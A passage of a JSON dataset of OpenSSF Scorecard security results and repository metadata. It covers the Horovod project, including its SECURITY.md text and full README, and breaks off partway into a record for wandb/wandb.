                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:221-231",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:221-231",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:221-231",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:221-231",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:234-236",
                        "Warn: pipCommand not pinned by hash: docker/horovod-cpu/Dockerfile:63",
                        "Warn: pipCommand not pinned by hash: docker/horovod-cpu/Dockerfile:64",
                        "Warn: pipCommand not pinned by hash: docker/horovod-cpu/Dockerfile:66",
                        "Warn: pipCommand not pinned by hash: docker/horovod-cpu/Dockerfile:67-70",
                        "Warn: pipCommand not pinned by hash: docker/horovod-cpu/Dockerfile:72",
                        "Warn: pipCommand not pinned by hash: docker/horovod-cpu/Dockerfile:79",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:67",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:68",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:69",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:87-94",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:87-94",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:87-94",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:97",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:115-117",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:122-132",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:122-132",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:135",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:140-147",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:140-147",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:140-147",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:148",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:151-153",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:165",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:174-184",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:174-184",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:188-191",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:188-191",
                        "Warn: pipCommand not pinned by hash: docker/horovod-nvtabular/Dockerfile:194-196",
                        "Warn: pipCommand not pinned by hash: docker/horovod-ray/Dockerfile:38-41",
                        "Warn: pipCommand not pinned by hash: docker/horovod-ray/Dockerfile:42",
                        "Warn: pipCommand not pinned by hash: docker/horovod-ray/Dockerfile:45",
                        "Warn: pipCommand not pinned by hash: docker/horovod-ray/Dockerfile:46-49",
                        "Warn: pipCommand not pinned by hash: docker/horovod-ray/Dockerfile:57-61",
                        "Warn: pipCommand not pinned by hash: docker/horovod/Dockerfile:79-82",
                        "Warn: pipCommand not pinned by hash: docker/horovod/Dockerfile:83",
                        "Warn: pipCommand not pinned by hash: docker/horovod/Dockerfile:85",
                        "Warn: pipCommand not pinned by hash: docker/horovod/Dockerfile:86-89",
                        "Warn: pipCommand not pinned by hash: docker/horovod/Dockerfile:91",
                        "Warn: pipCommand not pinned by hash: docker/horovod/Dockerfile:98",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:95",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:4488",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:4489",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:4490",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:4491",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:4492",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:4493",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:71",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:72",
                        "Warn: pipCommand not pinned by hash: .github/workflows/codeql-analysis.yml:48",
                        "Warn: pipCommand not pinned by hash: .github/workflows/upload-pypi.yml:27",
                        "Warn: pipCommand not pinned by hash: .github/workflows/upload-pypi.yml:28",
                        "Info:   0 out of  33 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of  15 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   6 containerImage dependencies pinned",
                        "Info:   0 out of   2 downloadThenRun dependencies pinned",
                        "Info:   0 out of  97 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Info: SAST configuration detected: CodeQL",
                        "Warn: 15 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 8,
                    "reason": "SAST tool detected but not run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Warn: no linked content found",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 4,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/ci-results.yaml:26",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/ci-results.yaml:28",
                        "Warn: jobLevel 'statuses' permission set to 'write': .github/workflows/ci-results.yaml:80",
                        "Warn: jobLevel 'statuses' permission set to 'write': .github/workflows/ci-results.yaml:113",
                        "Warn: jobLevel 'statuses' permission set to 'write': .github/workflows/ci-results.yaml:170",
                        "Warn: jobLevel 'statuses' permission set to 'write': .github/workflows/ci-results.yaml:203",
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/ci-results.yaml:262",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/ci-results.yaml:263",
                        "Warn: jobLevel 'checks' permission set to 'write': .github/workflows/ci-results.yaml:266",
                        "Info: found token with 'none' permissions: .github/workflows/ci-results.yaml:1",
                        "Info: found token with 'none' permissions: .github/workflows/ci.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/codeql-analysis.yml:1",
                        "Info: found token with 'none' permissions: .github/workflows/upload-pypi.yml:1"
                    ],
                    "score": 9,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-3pqx-4fqf-j49f / PYSEC-2020-176",
                        "Warn: Project is vulnerable to: GHSA-6757-jp84-gxfx / PYSEC-2020-96",
                        "Warn: Project is vulnerable to: GHSA-8q59-q68h-6hv4 / PYSEC-2021-142"
                    ],
                    "score": 7,
                    "reason": "3 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/horovod/horovod/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Reporting a Vulnerability\n\nPlease report security vulnerabilities to horovod-security@lists.lfaidata.foundation.\n\nAnyone can post to this mailing list, however, only active maintainers of the Horovod project will be able to read to the message.\n",
        "project_all_labels": [
            "awaiting response",
            "bug",
            "contribution welcome",
            "dependencies",
            "duplicate",
            "elastic",
            "enhancement",
            "github_actions",
            "invalid",
            "python",
            "question",
            "ray",
            "spark",
            "tracking",
            "update docs",
            "upstream bug",
            "wontfix"
        ],
        "README_content": ".. raw:: html\n\n    <p align=\"center\"><img src=\"https://user-images.githubusercontent.com/16640218/34506318-84d0c06c-efe0-11e7-8831-0425772ed8f2.png\" alt=\"Logo\" width=\"200\"/></p>\n    <br/>\n\nHorovod\n=======\n\n.. raw:: html\n\n   <div align=\"center\">\n\n.. image:: https://badge.fury.io/py/horovod.svg\n   :target: https://badge.fury.io/py/horovod\n   :alt: PyPI Version\n\n.. image:: https://badge.buildkite.com/6f976bc161c69d9960fc00de01b69deb6199b25680a09e5e26.svg?branch=master\n   :target: https://buildkite.com/horovod/horovod\n   :alt: Build Status\n\n.. image:: https://readthedocs.org/projects/horovod/badge/?version=latest\n   :target: https://horovod.readthedocs.io/en/latest/\n   :alt: Documentation Status\n\n.. image:: https://img.shields.io/badge/slack-chat-green.svg?logo=slack\n   :target: https://forms.gle/cPGvty5hp31tGfg79\n   :alt: Slack\n\n.. raw:: html\n\n   </div>\n\n.. raw:: html\n\n   <div align=\"center\">\n\n.. image:: https://img.shields.io/badge/License-Apache%202.0-blue.svg\n   :target: https://img.shields.io/badge/License-Apache%202.0-blue.svg\n   :alt: License\n\n.. image:: https://app.fossa.com/api/projects/git%2Bgithub.com%2Fhorovod%2Fhorovod.svg?type=shield\n   :target: https://app.fossa.com/projects/git%2Bgithub.com%2Fhorovod%2Fhorovod?ref=badge_shield\n   :alt: FOSSA Status\n\n.. image:: https://bestpractices.coreinfrastructure.org/projects/2373/badge\n   :target: https://bestpractices.coreinfrastructure.org/projects/2373\n   :alt: CII Best Practices\n\n.. image:: https://pepy.tech/badge/horovod\n   :target: https://pepy.tech/project/horovod\n   :alt: Downloads\n\n.. raw:: html\n\n   </div>\n\n.. inclusion-marker-start-do-not-remove\n\n|\n\nHorovod is a distributed deep learning training framework for TensorFlow, Keras, PyTorch, and Apache MXNet.\nThe goal of Horovod is to make distributed deep learning fast and easy to use.\n\n\n.. raw:: html\n\n   <p><img src=\"https://raw.githubusercontent.com/lfai/artwork/master/lfaidata-assets/lfaidata-project-badge/graduate/color/lfaidata-project-badge-graduate-color.png\" alt=\"LF AI & Data\" width=\"200\"/></p>\n\n\nHorovod is hosted by the `LF AI & Data Foundation <https://lfdl.io>`_ (LF AI & Data). If you are a company that is deeply\ncommitted to using open source technologies in artificial intelligence, machine, and deep learning, and want to support\nthe communities of open source projects in these domains, consider joining the LF AI & Data Foundation. For details\nabout who's involved and how Horovod plays a role, read the Linux Foundation `announcement <https://lfdl.io/press/2018/12/13/lf-deep-learning-welcomes-horovod-distributed-training-framework-as-newest-project/>`_.\n\n|\n\n.. contents::\n\n|\n\nDocumentation\n-------------\n\n- `Latest Release <https://horovod.readthedocs.io/en/stable>`_\n- `master <https://horovod.readthedocs.io/en/latest>`_\n\n|\n\nWhy Horovod?\n------------\nThe primary motivation for this project is to make it easy to take a single-GPU training script and successfully scale\nit to train across many GPUs in parallel. This has two aspects:\n\n1. How much modification does one have to make to a program to make it distributed, and how easy is it to run it?\n2. How much faster would it run in distributed mode?\n\nInternally at Uber we found the MPI model to be much more straightforward and require far less code changes than previous\nsolutions such as Distributed TensorFlow with parameter servers. Once a training script has been written for scale with\nHorovod, it can run on a single-GPU, multiple-GPUs, or even multiple hosts without any further code changes.\nSee the `Usage <#usage>`__ section for more details.\n\nIn addition to being easy to use, Horovod is fast. Below is a chart representing the benchmark that was done on 128\nservers with 4 Pascal GPUs each connected by RoCE-capable 25 Gbit/s network:\n\n.. image:: https://user-images.githubusercontent.com/16640218/38965607-bf5c46ca-4332-11e8-895a-b9c137e86013.png\n   :alt: 512-GPU Benchmark\n\nHorovod achieves 90% scaling efficiency for both Inception V3 and ResNet-101, and 68% scaling efficiency for VGG-16.\nSee `Benchmarks <docs/benchmarks.rst>`_ to find out how to reproduce these numbers.\n\nWhile installing MPI and NCCL itself may seem like an extra hassle, it only needs to be done once by the team dealing\nwith infrastructure, while everyone else in the company who builds the models can enjoy the simplicity of training them at\nscale.\n\n\nInstall\n-------\nTo install Horovod on Linux or macOS:\n\n1. Install `CMake <https://cmake.org/install/>`__\n\n.. raw:: html\n\n    <p/>\n\n2. If you've installed TensorFlow from `PyPI <https://pypi.org/project/tensorflow>`__, make sure that ``g++-5`` or above is installed.\n   Starting with TensorFlow 2.10 a C++17-compliant compiler like ``g++8`` or above will be required.\n\n   If you've installed PyTorch from `PyPI <https://pypi.org/project/torch>`__, make sure that ``g++-5`` or above is installed.\n\n   If you've installed either package from `Conda <https://conda.io>`_, make sure that the ``gxx_linux-64`` Conda package is installed.\n\n.. raw:: html\n\n    <p/>\n\n3. Install the ``horovod`` pip package.\n\n   To run on CPUs:\n\n   .. code-block:: bash\n\n      $ pip install horovod\n\n   To run on GPUs with NCCL:\n\n   .. code-block:: bash\n\n      $ HOROVOD_GPU_OPERATIONS=NCCL pip install horovod\n\nFor more details on installing Horovod with GPU support, read `Horovod on GPU <docs/gpus.rst>`_.\n\nFor the full list of Horovod installation options, read the `Installation Guide <docs/install.rst>`_.\n\nIf you want to use MPI, read `Horovod with MPI <docs/mpi.rst>`_.\n\nIf you want to use Conda, read `Building a Conda environment with GPU support for Horovod <docs/conda.rst>`_.\n\nIf you want to use Docker, read `Horovod in Docker <docs/docker.rst>`_.\n\nTo compile Horovod from source, follow the instructions in the `Contributor Guide <docs/contributors.rst>`_.\n\n\nConcepts\n--------\nHorovod core principles are based on `MPI <http://mpi-forum.org/>`_ concepts such as *size*, *rank*,\n*local rank*, **allreduce**, **allgather**, **broadcast**, and **alltoall**. See `this page <docs/concepts.rst>`_\nfor more details.\n\nSupported frameworks\n--------------------\nSee these pages for Horovod examples and best practices:\n\n- `Horovod with TensorFlow <docs/tensorflow.rst>`_\n- `Horovod with XLA in Tensorflow <xla.rst>`_\n- `Horovod with Keras <docs/keras.rst>`_\n- `Horovod with PyTorch <docs/pytorch.rst>`_\n- `Horovod with MXNet <docs/mxnet.rst>`_\n\nUsage\n-----\n\nTo use Horovod, make the following additions to your program:\n\n1. Run ``hvd.init()`` to initialize Horovod.\n\n.. raw:: html\n\n    <p/>\n\n2. Pin each GPU to a single process to avoid resource contention.\n\n   With the typical setup of one GPU per process, set this to *local rank*. The first process on\n   the server will be allocated the first GPU, the second process will be allocated the second GPU, and so forth.\n\n.. raw:: html\n\n    <p/>\n\n\n3. Scale the learning rate by the number of workers.\n\n   Effective batch size in synchronous distributed training is scaled by the number of workers.\n   An increase in learning rate compensates for the increased batch size.\n\n.. raw:: html\n\n    <p/>\n\n\n4. Wrap the optimizer in ``hvd.DistributedOptimizer``.\n\n   The distributed optimizer delegates gradient computation to the original optimizer, averages gradients using **allreduce** or **allgather**, and then applies those averaged gradients.\n\n.. raw:: html\n\n    <p/>\n\n\n5. Broadcast the initial variable states from rank 0 to all other processes.\n\n   This is necessary to ensure consistent initialization of all workers when training is started with random weights or restored from a checkpoint.\n\n.. raw:: html\n\n    <p/>\n\n\n6. Modify your code to save checkpoints only on worker 0 to prevent other workers from corrupting them.\n\n.. raw:: html\n\n    <p/>\n\n\nExample using TensorFlow v1 (see the `examples <https://github.com/horovod/horovod/blob/master/examples/>`_ directory for full training examples):\n\n.. code-block:: python\n\n    import tensorflow as tf\n    import horovod.tensorflow as hvd\n\n\n    # Initialize Horovod\n    hvd.init()\n\n    # Pin GPU to be used to process local rank (one GPU per process)\n    config = tf.ConfigProto()\n    config.gpu_options.visible_device_list = str(hvd.local_rank())\n\n    # Build model...\n    loss = ...\n    opt = tf.train.AdagradOptimizer(0.01 * hvd.size())\n\n    # Add Horovod Distributed Optimizer\n    opt = hvd.DistributedOptimizer(opt)\n\n    # Add hook to broadcast variables from rank 0 to all other processes during\n    # initialization.\n    hooks = [hvd.BroadcastGlobalVariablesHook(0)]\n\n    # Make training operation\n    train_op = opt.minimize(loss)\n\n    # Save checkpoints only on worker 0 to prevent other workers from corrupting them.\n    checkpoint_dir = '/tmp/train_logs' if hvd.rank() == 0 else None\n\n    # The MonitoredTrainingSession takes care of session initialization,\n    # restoring from a checkpoint, saving to a checkpoint, and closing when done\n    # or an error occurs.\n    with tf.train.MonitoredTrainingSession(checkpoint_dir=checkpoint_dir,\n                                           config=config,\n                                           hooks=hooks) as mon_sess:\n      while not mon_sess.should_stop():\n        # Perform synchronous training.\n        mon_sess.run(train_op)\n\n\nRunning Horovod\n---------------\nThe example commands below show how to run distributed training.\nSee `Run Horovod <docs/running.rst>`_ for more details, including RoCE/InfiniBand tweaks and tips for dealing with hangs.\n\n1. To run on a machine with 4 GPUs:\n\n   .. code-block:: bash\n\n        $ horovodrun -np 4 -H localhost:4 python train.py\n\n2. To run on 4 machines with 4 GPUs each:\n\n   .. code-block:: bash\n\n       $ horovodrun -np 16 -H server1:4,server2:4,server3:4,server4:4 python train.py\n\n3. To run using Open MPI without the ``horovodrun`` wrapper, see `Running Horovod with Open MPI <docs/mpi.rst>`_.\n\n4. To run in Docker, see `Horovod in Docker <docs/docker.rst>`_.\n\n5. To run on Kubernetes, see `Helm Chart <https://github.com/horovod/horovod/tree/master/docker/helm/>`_, `Kubeflow MPI Operator <https://github.com/kubeflow/mpi-operator/>`_, `FfDL <https://github.com/IBM/FfDL/tree/master/etc/examples/horovod/>`_, and `Polyaxon <https://docs.polyaxon.com/integrations/horovod/>`_.\n\n6. To run on Spark, see `Horovod on Spark <docs/spark.rst>`_.\n\n7. To run on Ray, see `Horovod on Ray <docs/ray.rst>`_.\n\n8. To run in Singularity, see `Singularity <https://github.com/sylabs/examples/tree/master/machinelearning/horovod>`_.\n\n9. To run in a LSF HPC cluster (e.g. Summit), see `LSF <docs/lsf.rst>`_.\n\n10. To run on Hadoop Yarn, see `TonY <https://github.com/linkedin/TonY/>`_.\n\nGloo\n----\n`Gloo <https://github.com/facebookincubator/gloo>`_ is an open source collective communications library developed by Facebook.\n\nGloo comes included with Horovod, and allows users to run Horovod without requiring MPI to be installed.\n\nFor environments that have support both MPI and Gloo, you can choose to use Gloo at runtime by passing the ``--gloo`` argument to ``horovodrun``:\n\n.. code-block:: bash\n\n     $ horovodrun --gloo -np 2 python train.py\n\nmpi4py\n------\nHorovod supports mixing and matching Horovod collectives with other MPI libraries, such as `mpi4py <https://mpi4py.scipy.org>`_,\nprovided that the MPI was built with multi-threading support.\n\nYou can check for MPI multi-threading support by querying the ``hvd.mpi_threads_supported()`` function.\n\n.. code-block:: python\n\n    import horovod.tensorflow as hvd\n\n    # Initialize Horovod\n    hvd.init()\n\n    # Verify that MPI multi-threading is supported.\n    assert hvd.mpi_threads_supported()\n\n    from mpi4py import MPI\n    assert hvd.size() == MPI.COMM_WORLD.Get_size()\n\nYou can also initialize Horovod with an `mpi4py` sub-communicator, in which case each sub-communicator\nwill run an independent Horovod training.\n\n.. code-block:: python\n\n    from mpi4py import MPI\n    import horovod.tensorflow as hvd\n\n    # Split COMM_WORLD into subcommunicators\n    subcomm = MPI.COMM_WORLD.Split(color=MPI.COMM_WORLD.rank % 2,\n                                   key=MPI.COMM_WORLD.rank)\n\n    # Initialize Horovod\n    hvd.init(comm=subcomm)\n\n    print('COMM_WORLD rank: %d, Horovod rank: %d' % (MPI.COMM_WORLD.rank, hvd.rank()))\n\n\nInference\n---------\nLearn how to optimize your model for inference and remove Horovod operations from the graph `here <docs/inference.rst>`_.\n\n\nTensor Fusion\n-------------\nOne of the unique things about Horovod is its ability to interleave communication and computation coupled with the ability\nto batch small **allreduce** operations, which results in improved performance. We call this batching feature Tensor Fusion.\n\nSee `here <docs/tensor-fusion.rst>`__ for full details and tweaking instructions.\n\n\nHorovod Timeline\n----------------\nHorovod has the ability to record the timeline of its activity, called Horovod Timeline.\n\n.. image:: https://user-images.githubusercontent.com/16640218/29735271-9e148da0-89ac-11e7-9ae0-11d7a099ac89.png\n   :alt: Horovod Timeline\n\nUse Horovod timeline to analyze Horovod performance.\nSee `here <docs/timeline.rst>`__ for full details and usage instructions.\n\n\nAutomated Performance Tuning\n----------------------------\nSelecting the right values to efficiently make use of Tensor Fusion and other advanced Horovod features can involve\na good amount of trial and error. We provide a system to automate this performance optimization process called\n**autotuning**, which you can enable with a single command line argument to ``horovodrun``.\n\nSee `here <docs/autotune.rst>`__ for full details and usage instructions.\n\n\nHorovod Process Sets\n--------------------\nHorovod allows you to concurrently run distinct collective operations in different groups of processes taking part in\none distributed training. Set up ``hvd.process_set`` objects to make use of this capability.\n\nSee `Process Sets <docs/process_set.rst>`__ for detailed instructions.\n\n\nGuides\n------\n1. Run distributed training in Microsoft Azure using `Batch AI and Horovod <https://github.com/Azure/BatchAI/tree/master/recipes/Horovod>`_.\n2. `Distributed model training using Horovod <https://spell.ml/blog/distributed-model-training-using-horovod-XvqEGRUAACgAa5th>`_.\n\nSend us links to any user guides you want to publish on this site\n\nTroubleshooting\n---------------\nSee `Troubleshooting <docs/troubleshooting.rst>`_ and submit a `ticket <https://github.com/horovod/horovod/issues/new>`_\nif you can't find an answer.\n\n\nCitation\n--------\nPlease cite Horovod in your publications if it helps your research:\n\n::\n\n    @article{sergeev2018horovod,\n      Author = {Alexander Sergeev and Mike Del Balso},\n      Journal = {arXiv preprint arXiv:1802.05799},\n      Title = {Horovod: fast and easy distributed deep learning in {TensorFlow}},\n      Year = {2018}\n    }\n\n\nPublications\n------------\n1. Sergeev, A., Del Balso, M. (2017) *Meet Horovod: Uber’s Open Source Distributed Deep Learning Framework for TensorFlow*.\nRetrieved from `https://eng.uber.com/horovod/ <https://eng.uber.com/horovod/>`_\n\n2. Sergeev, A. (2017) *Horovod - Distributed TensorFlow Made Easy*. Retrieved from\n`https://www.slideshare.net/AlexanderSergeev4/horovod-distributed-tensorflow-made-easy <https://www.slideshare.net/AlexanderSergeev4/horovod-distributed-tensorflow-made-easy>`_\n\n3. Sergeev, A., Del Balso, M. (2018) *Horovod: fast and easy distributed deep learning in TensorFlow*. Retrieved from\n`arXiv:1802.05799 <https://arxiv.org/abs/1802.05799>`_\n\n\nReferences\n----------\nThe Horovod source code was based off the Baidu `tensorflow-allreduce <https://github.com/baidu-research/tensorflow-allreduce>`_\nrepository written by Andrew Gibiansky and Joel Hestness. Their original work is described in the article\n`Bringing HPC Techniques to Deep Learning <http://andrew.gibiansky.com/blog/machine-learning/baidu-allreduce/>`_.\n\nGetting Involved\n----------------\n- `Community Slack <https://forms.gle/cPGvty5hp31tGfg79>`_ for collaboration and discussion\n- `Horovod Announce <https://lists.lfai.foundation/g/horovod-announce>`_ for updates on the project\n- `Horovod Technical-Discuss <https://lists.lfai.foundation/g/horovod-technical-discuss>`_ for public discussion\n- `Horovod Security <https://lists.lfai.foundation/g/horovod-security>`_ to report security vulnerabilities\n\n\n.. inclusion-marker-end-do-not-remove\n   Place contents above here if they should also appear in read-the-docs.\n   Contents below are already part of the read-the-docs table of contents.\n",
        "num_commits": 1340,
        "project_age_days": 2638,
        "project_created_at": "2017-08-09",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-08-31",
        "num_contributors": 160,
        "num_pull": 1602,
        "num_issues": 3844,
        "num_opening_issue": 406,
        "project_size(kB)": 6950,
        "num_stargazers": 14243,
        "num_watchers": 14243,
        "num_forks": 2235,
        "num_subscribers": 335,
        "SecurityPolicy_created_at": "2022-01-13 21:08:59",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "8c0d82a44a01bd7d8006e3da5b27ecd7a2cc9c2f",
                "url": "https://github.com/horovod/horovod/commit/8c0d82a44a01bd7d8006e3da5b27ecd7a2cc9c2f",
                "date": "2022-01-13 21:08:59"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "wandb/wandb",
        "project_url": "https://github.com/wandb/wandb",
        "SSF": {
            "date": "2024-10-29T19:02:54+07:00",
            "repo": {
                "name": "github.com/wandb/wandb",
                "commit": "1c51d21f88d3e155ac2d635ad9cf79e1a1935f79"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.4,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'release-0.18.5'",
                        "Warn: branch protection not enabled for branch 'release-0.18.4'",
                        "Warn: branch protection not enabled for branch 'release-0.18.3'",
                        "Warn: branch protection not enabled for branch 'release-0.18.2'",
                        "Warn: branch protection not enabled for branch 'release-0.18.1'",
                        "Warn: branch protection not enabled for branch 'release-0.18.0'",
                        "Warn: branch protection not enabled for branch 'release-0.17.9'",
                        "Warn: branch protection not enabled for branch 'release-0.17.8'",
                        "Warn: branch protection not enabled for branch 'release-0.17.7'",
                        "Warn: branch protection not enabled for branch 'release-0.17.6'",
                        "Warn: branch protection not enabled for branch 'release-0.17.5'",
                        "Warn: branch protection not enabled for branch 'release-0.17.4'",
                        "Warn: branch protection not enabled for branch 'release-0.17.3'",
                        "Warn: branch protection not enabled for branch 'release-0.17.2'",
                        "Warn: branch protection not enabled for branch 'release-0.17.1'",
                        "Warn: branch protection not enabled for branch 'release-0.17.0'",
                        "Warn: branch protection not enabled for branch 'release-0.16.6'",
                        "Warn: branch protection not enabled for branch 'release-0.16.5'",
                        "Warn: branch protection not enabled for branch 'release-0.16.4'",
                        "Warn: branch protection not enabled for branch 'release-0.16.3'",
                        "Warn: branch protection not enabled for branch 'release-0.16.2'",
                        "Warn: branch protection not enabled for branch 'release-0.16.1'",
                        "Warn: branch protection not enabled for branch 'release-0.16.0'",
                        "Warn: branch protection not enabled for branch 'release-0.15.12'",
                        "Warn: branch protection not enabled for branch 'release-0.15.11'",
                        "Warn: branch protection not enabled for branch 'release-0.15.10'",
                        "Warn: branch protection not enabled for branch 'release-0.15.9'",
                        "Warn: branch protection not enabled for branch 'release-0.15.8'",
                        "Warn: branch protection not enabled for branch 'release-0.15.7'",
                        "Warn: branch protection not enabled for branch 'release-0.15.6'",
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: required approving review count is 1 on branch 'main'",
                        "Info: codeowner review is required on branch 'main'",
                        "Info: status check found to merge onto on branch 'main'",
                        "Info: PRs are required in order to make changes on branch 'main'"
                    ],
                    "score": 0,
                    "reason": "branch protection not enabled on development/release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 out of 30 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "all changesets reviewed",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
